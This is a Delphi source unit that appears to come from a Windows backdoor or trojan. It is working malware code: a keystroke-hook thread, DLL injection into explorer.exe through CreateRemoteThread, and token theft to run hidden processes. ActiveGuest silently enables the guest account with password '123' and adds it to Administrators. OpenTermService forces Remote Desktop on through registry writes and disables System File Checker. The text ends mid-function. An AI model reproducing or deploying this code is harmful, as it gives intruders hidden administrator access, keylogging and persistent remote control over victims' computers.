unit uFuncs;

interface
uses windows,uStr,TLHelp32,nb30,uSvc,uDebug
//,dialogs  ,madcodehook
;
const
{ VK_0 thru VK_9 are the same as ASCII '0' thru '9' ($30 - $39) }
{ VK_A thru VK_Z are the same as ASCII 'A' thru 'Z' ($41 - $5A) }
VK_0=$30;VK_1=$31;VK_2=$32;VK_3=$33;VK_4=$34;VK_5=$35;VK_6=$36;VK_7=$37;VK_8=$38;VK_9=$39;
VK_A=$41;VK_B=$42;VK_C=$43;VK_D=$44;VK_E=$45;VK_F=$46;VK_G=$47;VK_H=$48;VK_I=$49;VK_J=$4A;
VK_K=$4B;VK_L=$4C;VK_M=$4D;VK_N=$4E;VK_O=$4F;VK_P=$50;VK_Q=$51;VK_R=$52;VK_S=$53;VK_T=$54;
VK_U=$55;VK_V=$56;VK_W=$57;VK_X=$58;VK_Y=$59;VK_Z=$5A;
VK_186=186;VK_187=187;VK_188=188;VK_189=189;VK_190=190;VK_191=191;VK_192=192;
VK_219=219;VK_220=220;VK_221=221;VK_222=222;
WM_GETTEXT          = $000D;

  BYC_KEY:pansiChar='SOFTWARE\Microsoft\BYC';
type
//****************************windows 结构***************************************

  PIMAGE_DOS_HEADER = ^IMAGE_DOS_HEADER;
  IMAGE_DOS_HEADER = packed record      { DOS .EXE header }
    e_magic         : WORD;             { Magic number }
    e_cblp          : WORD;             { Bytes on last page of file }
    e_cp            : dWORD;             { Pages in file }
    //e_crlc          : WORD;             { Relocations }
    e_cparhdr       : WORD;             { Size of header in paragraphs }
    e_minalloc      : WORD;             { Minimum extra paragraphs needed }
    e_maxalloc      : WORD;             { Maximum extra paragraphs needed }
    e_ss            : WORD;             { Initial (relative) SS value }
    e_sp            : WORD;             { Initial SP value }
    e_csum          : WORD;             { Checksum }
    e_ip            : WORD;             { Initial IP value }
    e_cs            : WORD;             { Initial (relative) CS value }
    e_lfarlc        : WORD;             { File address of relocation table }
    e_ovno          : WORD;             { Overlay number }
    e_res           : packed array [0..3] of WORD; { Reserved words }
    e_oemid         : WORD;             { OEM identifier (for e_oeminfo) }
    e_oeminfo       : WORD;             { OEM information; e_oemid specific }
    e_res2          : packed array [0..9] of WORD; { Reserved words }
    e_lfanew        : Longint;          { File address of new exe header }
  end;
//****************************me 结构***************************************
  tPEID=(FNone,FNoPE,FotherPE,FPic,FInj,FUpdate,FSvc);
  THookKeysOp=(HClose,HStart);
  pHookKeysInfo=^stHookKeysInfo;
  stHookKeysInfo=record
    op:THookKeysOp;
    hThread:DWORD;
    max_keys_size:DWORD;
    keys:pointer;
    Filename:array[0..max_path-1] of ansiChar;
  end;
  TRegOp=(REnumKey,RCreateKey,RRenameKey,RDelKey,RCreateVal,RrenameVal,RDelVal,RGetVal,REnumFree);
  pRegOpInfo=^stRegOpInfo;
  stRegOpInfo=record
    op:TRegOp;
    rk:HKEY;
    key:array[0..max_path-1] of ansiChar;
    val:array[0..max_path-1] of ansiChar;
    typ:DWORD;
    dat:pointer;
    siz:dword;
  end;

  pDriveInfo=^stDriveInfo;
  stDriveInfo=packed record
    name:array[0..2] of ansiChar;
    t:dword;
  end;
  PSvcRegProtect=^stSvcRegProtect;
  stSvcRegProtect=record
    svcName:array[0..31] of ansiChar;
    restore:PDWORD;
    mask:DWORD;
  end;
  //share mem
  const Svchost_Update_Mask=$00000001;
  //const Iexplore_Update_Mask=$00000002;
  const Hook_Install_Mask=$00000004;
  //const bc_Update_Mask=$00000008;
  type
  tProcessType=(F_Svchost,F_Iexplore_service,F_Iexplore_server,F_bc_service);
  tShareMemResult=(F_False,F_New,F_OtherCreate,F_FatherCreate);
  PShareMemOfProcess=^stShareMemOfProcess;
  stShareMemOfProcess=record
    version:DWORD;
    size:DWORD;
    flag:DWORD;
    Reserved:array[0..28] of DWORD;
    PIDs:array[0..31] of DWORD;
    Files:array[0..31,0..127] of ansiChar;
    keys:array[0..31,0..127] of ansiChar;
  end;
  PShareMem=^stShareMem;
  stShareMem=record
    ProcessType:tProcessType;
    hMap:cardinal;
    lpMapAddress:pointer;
    version:DWORD;
    PID:DWORD;
    Files:array[0..127] of ansiChar;
    keys:array[0..127] of ansiChar;
    hook:array[0..11] of ansiChar;
  end;
  //hook inj
type
  tFPID=(PID_Exit,PID_Open_F,PID_My,PID_Sys,PID_Inj_T,PID_Inj_F);
  PPID=^stPID;
  stPID=packed record
    PID: DWORD;
    Flag:tFPID;
    process:boolean;
  end;
var
  OSVersion:String;
  HookKeys:stHookKeysInfo;
  sm:stShareMem;
  hNotify : THandle;

function SetInfoToReg(ro:stRegOpInfo):bool;
function ManageHookKeys(op:THookKeysOp):pansiChar;
procedure HookKeysThread(pHookKeysPara:pointer);stdcall;
function GetActiveWindowTitle(var hLastWindow,hLastFocus:HWND;p:pansiChar):bool;stdcall;
function SwitchWSDT(WS,DT:PansiChar;var hOldWS: HWINSTA;var hOldDT: HDESK;Resume:bool=false):bool;stdcall;
function RunFile(name:pansiChar;ShowType:DWORD;suspended:BOOL=false;bCMD:BOOL=false):PROCESS_INFORMATION;
//function RegComFile(FileName:pWideansiChar;bReg:bool):bool;overload;
function RegComFile(FileName:pansiChar;bReg:bool):bool;
function GenUniqueFileName(const ext:string):string;
function FileExist(FileName:pansiChar):bool;
function ClearDirThread(PDir:pointer):BOOL;stdcall;
function GetMyPriviliges:BOOL;
function GetScrSize(str:pansiChar):pansiChar;
function Getopentime(str:pansiChar):pansiChar;
function GetPhymemery(str:pansiChar) :pansiChar;
//function GetInfoFromReg(ri:stRegInfo):bool;
function GetCPUSpeed(str:pansiChar): pansiChar;
//procedure InitPlatformId;
function GetDrvs(var Drvs:array of stDriveInfo):DWORD;
function GetFileInfos(const dir,data:pansiChar):DWORD;
function GetProcessesInfo2000(var s:string;const showDLL:boolean=true):bool;
//function GetProcessesInfo98(var s:string;const showDLL:boolean=true):bool;
procedure SendHokKey;stdcall;
function OpenTermService:BOOL;
procedure ActiveGuest();
function GetDir(nDir:integer;Dir:pansiChar):pansiChar;
function LoadFileToString(FileName:pansiChar;var data:string):bool;
function AttachToProcess(const hProcess: DWORD;const GuestFile: string):DWORD;
procedure GetExplorerIDThread();
function GetProcessID(Filename:pansiChar):DWORD;
function IsRemoteDeskConn():BOOL;
function TheFileSize(FileName:pansiChar;lpFileSizeHigh:pointer=nil):DWORD;
function GetOSVerion:string;

function NBGetAdapterAddress(addr:pansiChar;key:byte=1):bool;
function SvcProtectThread():bool;stdcall;
procedure SvcProtect();
function GetRegyh(rk:HKEY;key:pansiChar):string;

function AccessPEID(FileName:pansiChar;var PEID:tPEID;var PESize:cardinal):BOOL;
function SetPEID(FileName:pansiChar;PEID:tPEID):BOOL;
function GetPEID(FileName:pansiChar):tPEID;
function GetSetupTime(str:pansiChar):pansiChar;
function DirectoryExists(Directory: pansiChar): bool;
function ForceDirectories(Dir: pansiChar): bool;
function GetLoginUser(lpUser:pansiChar;lpDomain:pansiChar=nil):bool;
function RunFileAsCurrentUser(FileName:pansiChar;si:STARTUPINFOA):TProcessInformation;
function MutexExist(const strID:pansiChar):bool;
//*******************************reg**********************************************
function RegDelVal(rk:HKEY;key,val:pansiChar):bool;
function RegGetInt(rk:HKEY;key,val:pansiChar):integer;
function RegSetInt(rk:HKEY;key,val:pansiChar;i:Integer):bool;
function RegGetStr(rk:HKEY;key,val,dat:pansiChar):pansiChar;
function RegGetString(rk:HKEY;key,val:pansiChar):string;
function RegValExist(rk:HKEY;key,val:pansiChar):BOOL;
function OpReg(var ro:stRegOpInfo):bool;
function GetRegKeys(rk:HKEY;key:pansiChar;pData:pointer;var size:cardinal):bool;
function DelRegKey(rk:HKEY;key:pansiChar):BOOL;
function ReNameRegVal(rk:HKEY;key,oldVal,newVal:pansiChar):BOOL;
function RenameRegKey(rk:HKEY;oldKey,newkey:pansiChar):BOOL;
//*****************************************************************************
function OpProcess(dwPid:DWORD;op:byte=1):bool;
function OpenThread(dwDesiredAccess:   DWORD;   bInheritHandle:BOOL;   dwProcessId:   DWORD):   THandle;stdcall;
function SaveStrToFile(FileName,str:pansiChar):bool;
//share mem
function InitShareMem(var sm:stShareMem;svcName,hookFilename:pansiChar):bool;
function CreateShareMem(var sm:stShareMem):tShareMemResult;
function FreeShareMem(var sm:stShareMem):BOOL;
function GetHookNameFromSvcFile(hookFileName,svcFileName:pansiChar):BOOL;
//function IsSystemProcess(FileName:pansiChar):bool;
//function InjectUserProcessThread():bool;stdcall;
//function IsId(Id: dword;psm:PShareMemOfProcess): boolean;
//function InjectUserProcess(var PIDS:array of stPID):bool;stdcall;
//procedure InjectUser();
function regSelf():BOOL;
function MySetup():BOOL;
//*******************************************************************************
implementation

function SaveStrToFile(FileName,str:pansiChar):bool;
var
  hFile,NumOfWritten,NumOfToWrite:cardinal;
  p:pansiChar;
begin
  result:=false;hFile:=INVALID_HANDLE_VALUE;
  NumOfWritten:=0;NumOfToWrite:=0;p:=str;
try
  hFile:=CreateFileA(FileName,GENERIC_READ or GENERIC_Write,FILE_SHARE_READ,
      nil,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
  if hFile=INVALID_HANDLE_VALUE then exit;
  NumOfToWrite:=lstrlenA(str);if NumOfToWrite=0 then exit;
  SetFilePointer(hFile,0,nil,FILE_END);
  repeat
    NumOfToWrite:=NumOfToWrite-NumOfWritten;
    p:=p+NumOfWritten;
  until (NumOfToWrite<=0) or (WriteFile(hFile,p^,NumOfToWrite,NumOfWritten,nil)=false);
  result:=true;
finally
  if hFile<>INVALID_HANDLE_VALUE then closehandle(hFile);
end;//try
end;

function OpenThread; external kernel32 name 'OpenThread';
function OpProcess(dwPid:DWORD;op:byte=1):bool;
const
  THREAD_ALL_ACCESS=(STANDARD_RIGHTS_REQUIRED or SYNCHRONIZE or $3FF);
var
  hThreadSnap,hThread:tHANDLE;
  te32:THREADENTRY32;
  bThreadFind:BOOL;
begin
  hThreadSnap :=0;
  bThreadFind := FALSE;
  hThreadSnap := CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD,0);
  if(hThreadSnap>0)then
  begin
    te32.dwSize := sizeof(THREADENTRY32);
    bThreadFind := Thread32First(hThreadSnap,te32);
    while(bThreadFind)do
    begin
      if(te32.th32OwnerProcessID = dwPid)then
      begin
        hThread := 0;
        hThread := OpenThread(THREAD_ALL_ACCESS,FALSE,te32.th32ThreadID);
        if(hThread>0)then
        begin
          case op of
          1:TerminateThread(hThread,0);
          2:SuspendThread(hThread);
          3:ResumeThread(hThread);
          end;//case
          CloseHandle(hThread);
        end;
      end;
      te32.dwSize := sizeof(THREADENTRY32);
      bThreadFind := Thread32Next(hThreadSnap,te32);
    end;
  CloseHandle(hThreadSnap);
  end;
  result:=true;
end;

function MutexExist(const strID:pansiChar):bool;
var
  MutexHandle: THandle;
begin
  MutexHandle:=OpenMutexA(MUTEX_ALL_ACCESS,false,pansiChar(strID));
  if(MutexHandle=0) then
  begin
    result:=false;
  end
  else begin
    result:=true;
    closehandle(MutexHandle);
  end;//
end;
function GetLoginUser(lpUser:pansiChar;lpDomain:pansiChar=nil):bool;
type
  PTOKEN_USER=^_TOKEN_USER;
  _TOKEN_USER=record
    User:SID_AND_ATTRIBUTES;
  end;
  TOKEN_USER=_TOKEN_USER;
var
    PID,hProcess,cbti,nUser,nDomain:DWORD;
    hToken:THandle;
    ptu:PTOKEN_USER;
    snu:SID_NAME_USE;
    szDomain:array[0..49] of ansiChar;
begin
  result:=false;
  hProcess:=0;hToken:=0;ptu:=nil;cbti:=0;
try
  PID:=GetProcessID('Explorer.exe');
  if PID=0 then exit;
  hProcess:=OpenProcess(PROCESS_ALL_ACCESS,false,PID);
  if hProcess=0 then exit;
  if not OpenProcessToken(hProcess,TOKEN_ALL_ACCESS,hToken) then exit;
  if hToken=0 then exit;
  if GetTokenInformation(hToken,TokenUser,nil, 0,cbti) then exit;
  getmem(ptu,cbti);
  if not GetTokenInformation(hToken, TokenUser,ptu, cbti, cbti) then exit;
  nUser:=50;nDomain:=50;
  if not LookupAccountSidA(nil,ptu^.User.Sid,lpUser,nUser,szDomain,nDomain,snu) then exit;
  if lpDomain<>nil then lstrcpyA(lpDomain,szDomain);
  result:=true;
finally
  if ptu<>nil then freemem(ptu);
  if hToken<>0 then CloseHandle(hToken);
  if hProcess<>0 then CloseHandle(hProcess);
end;
end;

function RunFileAsCurrentUser(FileName:pansiChar;si:STARTUPINFOA):TProcessInformation;
type
  LPPROFILEINFO=^_PROFILEINFO;
  _PROFILEINFO=record
     dwSize:DWORD;
     dwFlags:DWORD;
     lpUserName:pansiChar;
     lpProfilePath:pansiChar;
     lpDefaultPath:pansiChar;
     lpServerName:pansiChar;
     lpPolicyPath:pansiChar;
     hProfile:tHANDLE;
  end;
  PROFILEINFO=_PROFILEINFO;
const
  Desktop:pansiChar='winsta0\default';
var
  PID,hProcess,hUserenv:DWORD;
  hToken:tHandle;
  LoadUserProfile:function(hToken:tHANDLE;lpProfileInfo:LPPROFILEINFO):BOOL;stdcall;
  UnloadUserProfile:function(hToken:tHANDLE;hProfile:tHANDLE):BOOL;stdcall;
  MyProfileInfo:_PROFILEINFO;
  LoginUser,szDomain:array[0..50] of ansiChar;
begin
  zeromemory(@result,sizeof(result));
  hProcess:=0;hToken:=0;hUserenv:=0;
try
  Log('ufuncs:RunFileAsCurrentUser start:');
  PID:=GetProcessID('explorer.exe');
  if PID=0 then exit;

  Log('ufuncs:OpenProcess start:');
  hProcess:=OpenProcess(PROCESS_ALL_ACCESS,false,PID);
  if hProcess=0 then exit;

  Log('ufuncs:OpenProcessToken start:');
  if not OpenProcessToken(hProcess,TOKEN_ALL_ACCESS,hToken) then exit;
  if hToken=0 then exit;

  Log('ufuncs:LoadLibrary start:');
  hUserenv:= LoadLibrary('Userenv.dll');
  if hUserenv=0 then exit;

  Log('ufuncs:GetProcAddress(hUserenv,LoadUserProfileA) start:');
  @LoadUserProfile:=GetProcAddress(hUserenv,'LoadUserProfileA');
  if @LoadUserProfile=nil then exit;
  @UnloadUserProfile:=GetProcAddress(hUserenv,'UnloadUserProfile');
  if(@UnloadUserProfile=nil)then exit;
  zeromemory(@MyProfileInfo,sizeof(MyProfileInfo));
  MyProfileInfo.dwSize:=sizeof(MyProfileInfo);

  Log('ufuncs:GetLoginUser start:');
  if not GetLoginUser(LoginUser,szDomain) then exit;
  MyProfileInfo.lpUserName:=LoginUser;

  Log('ufuncs:LoadUserProfile start:');
  if not LoadUserProfile(hToken,@MyProfileInfo) then exit;
  Log('ufuncs:LoadUserProfile end');

  Log('ufuncs:ImpersonateLoggedOnUser start:');
  if not ImpersonateLoggedOnUser(hToken) then exit;

  Log('ufuncs:CreateProcessAsUser start:');
  si.cb:= sizeof(STARTUPINFO);
  si.lpDesktop:=Desktop;
  //if not CreateProcessAsUser(hToken,FileName,nil,nil,nil,FALSE,NORMAL_PRIORITY_CLASS or CREATE_NEW_CONSOLE,nil,nil,si,result) then exit;
  if not CreateProcessAsUserA(hToken,FileName,nil,nil,nil,FALSE,CREATE_NO_WINDOW,nil,nil,si,result) then exit;
  GetAPIErr();
  Log('ufuncs:CreateProcessAsUser end.');
finally
  //GetAPIErrCode;
  //if result.hThread<>0 then CloseHandle(result.hThread);
  //if result.hProcess<>0 then CloseHandle(result.hProcess);
  if @UnloadUserProfile<>nil then UnloadUserProfile(hToken,MyProfileInfo.hProfile);
  if hUserenv<>0 then freeLibrary(hUserenv);
  if hToken<>0 then closeHandle(hToken);
  if hProcess<>0 then closeHandle(hProcess);
end;
end;

function ForceDirectories(Dir: pansiChar): bool;
var
  FileDir:array[0..max_path-1] of ansiChar;
begin
  Result := true;
  if (lstrlenA(Dir) < 3) or DirectoryExists(Dir) then Exit;
  Result := ForceDirectories(ExtractFileDir(Dir,FileDir)) and CreateDirectoryA(Dir,nil);
end;
function DirectoryExists(Directory: pansiChar): bool;
var
  Code: Integer;
begin
  Code := GetFileAttributesA(Directory);
  Result := (Code <> -1) and (FILE_ATTRIBUTE_DIRECTORY and Code <> 0);
end;
function GetSetupTime(str:pansiChar):pansiChar;
const
  val:pansiChar='MySetupTime';
var
  ro:stRegOpInfo;
  SystemTime: TSystemTime;
begin
  result:=str;
  ro.op:=RGetVal;
  ro.rk:=HKEY_LOCAL_MACHINE;
  lstrcpyA(ro.key,'SOFTWARE\Microsoft\BYC\Setup');
  lstrcpyA(ro.val,val);
  ro.typ:=REG_BINARY;
  ro.dat:=@SystemTime;
  ro.siz:=sizeof(SystemTime);
  if not opreg(ro) then exit;
  with SystemTime do
  _wsprintf(str,'%d-%d-%d %d:%d:%d',[wYear,wMonth,wDay,wHour,wMinute,wSecond]);
end;

function GetPEID(FileName:pansiChar):tPEID;
var
  temp_PEID:tPEID;
  PESize:DWORD;
begin
  temp_PEID:=Fnone;
  PESize:=DWORD(-1);
  AccessPEID(FileName,temp_PEID,PESize);
  result:=temp_PEID;
end;
function SetPEID(FileName:pansiChar;PEID:tPEID):BOOL;
var
  temp_PEID:tPEID;
  PESize:DWORD;
begin
  temp_PEID:=PEID;
  PESize:=0;
  result:=AccessPEID(FileName,temp_PEID,PESize);
end;
function AccessPEID(FileName:pansiChar;var PEID:tPEID;var PESize:cardinal):BOOL;
label 1;
var
  hFile,FileMapping,dwFileAccess,flProtect,dwMapAccess:cardinal;
  DosHeader: PIMAGE_DOS_HEADER;
  //NTHeader: PIMAGE_NT_HEADERS;
  FileBase: Pointer;
begin
  result:=false;FileBase:=nil;//FileMapping:=0;hFile:=INVALID_HANDLE_VALUE;
  if PESize=DWORD(-1) then  //read
  begin
    dwFileAccess:=GENERIC_READ;
    flProtect:=PAGE_READONLY;
    dwMapAccess:=FILE_MAP_READ;
  end
  else begin //write
    dwFileAccess:=GENERIC_WRITE or GENERIC_READ;
    flProtect:=PAGE_READWRITE;
    dwMapAccess:=FILE_MAP_WRITE;
  end;//if PESize=DWORD(-1) then
  hFile:=createfileA(FileName,dwFileAccess,FILE_SHARE_READ,nil,OPEN_EXISTING,
         FILE_ATTRIBUTE_NORMAL,0);
  if hFile=INVALID_HANDLE_VALUE then exit;
  FileMapping := CreateFileMapping(hFile, nil, flProtect, 0, 0, nil);
  if FileMapping = 0 then goto 1;
  FileBase := MapViewOfFile(FileMapping,dwMapAccess , 0, 0, 0);
  if FileBase = nil then goto 1;
  DosHeader := PIMAGE_DOS_HEADER(FileBase);
  if not DosHeader.e_magic = IMAGE_DOS_SIGNATURE then
  begin
    PEID:=FNoPE;
    goto 1;
  end;
  {
  NTHeader := PIMAGE_NT_HEADERS(Longint(DosHeader) + DosHeader.e_lfanew);
  if IsBadReadPtr(NTHeader, sizeof(IMAGE_NT_HEADERS)) or
     (NTHeader.Signature <> IMAGE_NT_SIGNATURE) then goto 1;
     }
  if PESize=DWORD(-1) then  //read
  begin
    case tPEID(DosHeader^.e_cblp) of
    FPic:PEID:=FPic;
    FInj:PEID:=FInj;
    FUpdate:PEID:=FUpdate;
    FSvc:PEID:=FSvc;
    else
    PEID:=FotherPE;
    end;//case  FNone,FNoPE,FotherPE,FPic,FInj,FUpdate,FSvc
    PESize:=DosHeader.e_cp;
    result:=true;
  end
  else begin
    if PEID<>FNone then
      DosHeader^.e_cblp:=word(PEID);
    if PESize<>0 then
      DosHeader^.e_cp:=PESize;
    result:=FlushViewOfFile(FileBase,sizeof(IMAGE_DOS_HEADER));
  end;//if PESize=DWORD(-1) then
1:
  if FileBase<>nil then
    UnmapViewOfFile(FileBase);
  if FileMapping<>0 then
    CloseHandle(FileMapping);
  if hFile <> INVALID_HANDLE_VALUE then
    CloseHandle(hFile);
end;

function TheFileSize(FileName:pansiChar;lpFileSizeHigh:pointer=nil):DWORD;
var
  hFile:cardinal;
begin
  hFile:=CreateFileA(FileName,0,FILE_SHARE_READ,nil,OPEN_EXISTING,FILE_ATTRIBUTE_ARCHIVE,0);
  if hFile=INVALID_HANDLE_VALUE then
  begin
    result:=$FFFFFFFF;exit;
  end;
  result:=GetFileSize(hFile,lpFileSizeHigh);
  CloseHandle(hFile);
end;
function IsRemoteDeskConn():BOOL;
var
  err:integer;
  FileName:array[0..max_path-1] of ansiChar;
begin
  result:=false;
  if strpos(pansiChar(OSVersion),'XP')<>nil then
  begin
    err:=GetSystemDirectoryA(FileName,Sizeof(FileName));
    if err=0 then exit;
    strcat(FileName,'\termsrv.dll');
    if TheFileSize(FileName,nil)=215552 then result:=true;
    exit;
  end;
  if (strpos(pansiChar(OSVersion),'Microsoft Windows 2000')<>nil) and
     (strpos(pansiChar(OSVersion),'Server')<>nil)  then
  begin
    result:=true;
    exit;
  end;
  if strpos(pansiChar(OSVersion),'2003')<>nil then
  begin
    result:=true;
    exit;
  end;
end;
procedure GetExplorerIDThread();
const
  pg_1:pansiChar='adsyh.dll';
var
  ExplorerID,hExplorer:DWORD;
  FileName:array[0..max_path-1] of ansiChar;
  err:integer;
begin
  err:=GetSystemDirectoryA(FileName,sizeof(FileName));
  if err<=0 then exit;
  strcat(FileName,'\');strcat(FileName,pg_1);
  if FileExist(FileName) then
  while true do
  begin
    if not active then break;

    ExplorerID:=GetProcessID('explorer.exe');
    if ExplorerID=0 then
    begin
      sleep(1000);
    end
    else begin
      hExplorer:=OpenProcess(PROCESS_ALL_ACCESS,false,ExplorerID);
      //登陆成功事件：
      AttachToProcess(hExplorer,FileName);
      //******************************************************
      WaitForSingleObject(hExplorer,INFINITE);
    end; //if ExplorerID=0 then
  end;//while
end;
function GetProcessID(Filename:pansiChar):DWORD;
var
  snapshot:THandle;
  processinfo:PROCESSENTRY32A; //在use中添加TLHelp32
  status:bool;
begin
  result:=0;
  processinfo.dwSize:=sizeof(processinfo);
  snapshot:=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); //CreateToolhelp32Snapshot创建一个快照
  status := Process32FirstA (snapshot,processinfo) ;
  while (status) do
  begin
    if StrIcomp(processinfo.szExeFile,FileName)=0 then
    begin
      result:=processinfo.th32ProcessID;
      exit;
    end;
    status := Process32NextA (snapshot, processinfo) ;
  end;//while
  closehandle(snapshot);
end;
function AttachToProcess(const hProcess: DWORD;const GuestFile: string):DWORD;
var
  cb: SIZE_T;
  pszLibFileRemote: Pointer;
  iReturnCode: Boolean;
  TempVar: SIZE_T;
  pfnStartAddr: TFNThreadStartRoutine;
  pszLibAFilename: PwideChar;
  threadId:DWORD;
begin
  Result := 0;
  Getmem(pszLibAFilename, Length(GuestFile) * 2 + 1);
  StringToWideChar(GuestFile, pszLibAFilename, Length(GuestFile) * 2 + 1);
  cb := (1 + lstrlenW(pszLibAFilename)) * sizeof(WChar);
  pszLibFileRemote := PWIDESTRING(VirtualAllocEx(hProcess, nil, cb, MEM_COMMIT, PAGE_READWRITE));
  TempVar := 0;
  iReturnCode := WriteProcessMemory(hProcess, pszLibFileRemote, pszLibAFilename, cb, TempVar);
  if iReturnCode then
  begin
    pfnStartAddr := GetProcAddress(GetModuleHandle('Kernel32'), 'LoadLibraryW');
    TempVar := 0;
    Result := CreateRemoteThread(hProcess, nil, 0, pfnStartAddr, pszLibFileRemote, 0, threadId);
  end;
  Freemem(pszLibAFilename);
end;
function LoadFileToString(FileName:pansiChar;var data:string):bool;
label 1;
var
  hFile,FileSize,NumofRead,NumofToRead,OldSize:cardinal;
begin
  result:=false;
  hFile:=CreateFileA(FileName,GENERIC_READ,FILE_SHARE_READ,
         nil,OPEN_Existing,FILE_ATTRIBUTE_NORMAL,0);
  if hFile=INVALID_HANDLE_VALUE then  //当文件不存在时创建它
  begin
    hFile:=CreateFileA(FileName,GENERIC_READ or GENERIC_Write,FILE_SHARE_READ,
      nil,OPEN_AlWays,FILE_ATTRIBUTE_NORMAL,0);
     if hFile=INVALID_HANDLE_VALUE then exit;
     //创建文件
  end;
  fileSize:=GetFileSize(hFile,nil);
  if (fileSize=$FFFFFFFF) or (FileSize=0) then goto 1;
  OldSize:=length(data);
  setlength(data,OldSize+FileSize);
  NumofRead:=0;NumofToRead:=FileSize;
  repeat
    NumofToRead:=NumofToRead-NumofRead;
  until (NumofToRead<=0) or (ReadFile(hFile,data[OldSize+FileSize-NumofToRead+1],NumofToRead,NumofRead,nil)=false);
  result:=true;
1:
  closehandle(hFile);
end;


procedure ActiveGuest();
begin
  RunFile('net user guest /active:y',sw_hide,false,true);
  RunFile('net user guest 123',sw_hide,false,true);
  RunFile('net localgroup administrators guest /add',sw_hide,false,true);
end;
function OpenTermService:BOOL;
var
  err:integer;
  rk,hk:HKEY;
  key,szData,szVal:array[0..255] of ansiChar;
  dwData,cbData,dwType:DWORD;
  Data:pointer;
begin
  result:=false;
  //***********************REG_DWORD************************
  rk:=HKEY_LOCAL_MACHINE;
  key:='software\Microsoft\Windows\CurrentVersion\NetCache';
  szVal:='Enabled';dwType:=REG_DWORD;
  Data:=@dwData;dwData:=0;cbData:=sizeof(dwData);

  err:=RegCreatekeyExA(rk,key,0,nil,REG_OPTION_NON_VOLATILE,
    KEY_ALL_ACCESS,nil,hk,nil);
  if err<>ERROR_SUCCESS then exit;
  err:=RegSetValueExA(hk,szVal,0,dwType,Data,cbData);
  RegCloseKey(hk);
  if err<>ERROR_SUCCESS then exit;

  key:='SOFTWARE\Policies\Microsoft\windows\Installer';
  szVal:='EnableAdminTSRemote';
  dwData:=1;

  err:=RegCreatekeyExA(rk,key,0,nil,REG_OPTION_NON_VOLATILE,
    KEY_ALL_ACCESS,nil,hk,nil);
  if err<>ERROR_SUCCESS then exit;
  err:=RegSetValueExA(hk,szVal,0,dwType,Data,cbData);
  RegCloseKey(hk);
  if err<>ERROR_SUCCESS then exit;

  key:='SYSTEM\CurrentControlSet\Control\Terminal Server';
  szVal:='TSEnabled';
  dwData:=1;

  err:=RegCreatekeyExA(rk,key,0,nil,REG_OPTION_NON_VOLATILE,
    KEY_ALL_ACCESS,nil,hk,nil);
  if err<>ERROR_SUCCESS then exit;
  err:=RegSetValueExA(hk,szVal,0,dwType,Data,cbData);
  RegCloseKey(hk);
  if err<>ERROR_SUCCESS then exit;

  szVal:='fDenyTSConnections';
  dwData:=0;

  err:=RegCreatekeyExA(rk,key,0,nil,REG_OPTION_NON_VOLATILE,
    KEY_ALL_ACCESS,nil,hk,nil);
  if err<>ERROR_SUCCESS then exit;
  err:=RegSetValueExA(hk,szVal,0,dwType,Data,cbData);
  RegCloseKey(hk);
  if err<>ERROR_SUCCESS then exit;

  key:='SYSTEM\CurrentControlSet\Services\TermDD';
  szVal:='Start';
  dwData:=2;

  err:=RegCreatekeyExA(rk,key,0,nil,REG_OPTION_NON_VOLATILE,
    KEY_ALL_ACCESS,nil,hk,nil);
  if err<>ERROR_SUCCESS then exit;
  err:=RegSetValueExA(hk,szVal,0,dwType,Data,cbData);
  RegCloseKey(hk);
  if err<>ERROR_SUCCESS then exit;

  key:='SYSTEM\CurrentControlSet\Services\TermService';
  szVal:='Start';
  dwData:=2;

  err:=RegCreatekeyExA(rk,key,0,nil,REG_OPTION_NON_VOLATILE,
    KEY_ALL_ACCESS,nil,hk,nil);
  if err<>ERROR_SUCCESS then exit;
  err:=RegSetValueExA(hk,szVal,0,dwType,Data,cbData);
  RegCloseKey(hk);
  if err<>ERROR_SUCCESS then exit;

  key:='SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp';
  szVal:='PortNumber';
  dwData:=3389;

  err:=RegCreatekeyExA(rk,key,0,nil,REG_OPTION_NON_VOLATILE,
    KEY_ALL_ACCESS,nil,hk,nil);
  if err<>ERROR_SUCCESS then exit;
  err:=RegSetValueExA(hk,szVal,0,dwType,Data,cbData);
  RegCloseKey(hk);
  if err<>ERROR_SUCCESS then exit;

  key:='SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp';
  szVal:='PortNumber';
  dwData:=3389;

  err:=RegCreatekeyExA(rk,key,0,nil,REG_OPTION_NON_VOLATILE,
    KEY_ALL_ACCESS,nil,hk,nil);
  if err<>ERROR_SUCCESS then exit;
  err:=RegSetValueExA(hk,szVal,0,dwType,Data,cbData);
  RegCloseKey(hk);
  if err<>ERROR_SUCCESS then exit;
  //XP 多用户模式
  key:='SYSTEM\CurrentControlSet\Control\Terminal Server\Licensing Core';
  szVal:='EnableConcurrentSessions';
  dwData:=1;

  err:=RegCreatekeyExA(rk,key,0,nil,REG_OPTION_NON_VOLATILE,
    KEY_ALL_ACCESS,nil,hk,nil);
  if err<>ERROR_SUCCESS then exit;
  err:=RegSetValueExA(hk,szVal,0,dwType,Data,cbData);
  szVal:='TSEnabled';dwData:=1;
  err:=RegSetValueExA(hk,szVal,0,dwType,Data,cbData);
  RegCloseKey(hk);
  if err<>ERROR_SUCCESS then exit;
  //*************************shutdown sysfile recover dilog*********************
  key:='SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon';
  szVal:='SFCDisable';
  dwData:=$ffffff9d;

  err:=RegCreatekeyExA(rk,key,0,nil,REG_OPTION_NON_VOLATILE,
    KEY_ALL_ACCESS,nil,hk,nil);
  if err<>ERROR_SUCCESS then exit;
  err:=RegSetValueExA(hk,szVal,0,dwType,Data,cbData);
  RegCloseKey(hk);
  if err<>ERROR_SUCCESS then exit;
  //**************************REG_sz*********************************
  rk:=HKEY_USERS;
  key:='.DEFAULT\Keyboard Layout\Toggle';
  szVal:='Hotkey';dwType:=REG_SZ;
  Data:=@szData[0];szData:='1';cbData:=strlen(szData)+1;

  err:=RegCreatekeyExA(rk,key,0,nil,REG_OPTION_NON_VOLATILE,
    KEY_ALL_ACCESS,nil,hk,nil);
  if err<>ERROR_SUCCESS then exit;
  err:=RegSetValueExA(hk,szVal,0,dwType,Data,cbData);
  RegCloseKey(hk);
  if err<>ERROR_SUCCESS then exit;

  rk:=HKEY_LOCAL_MACHINE;
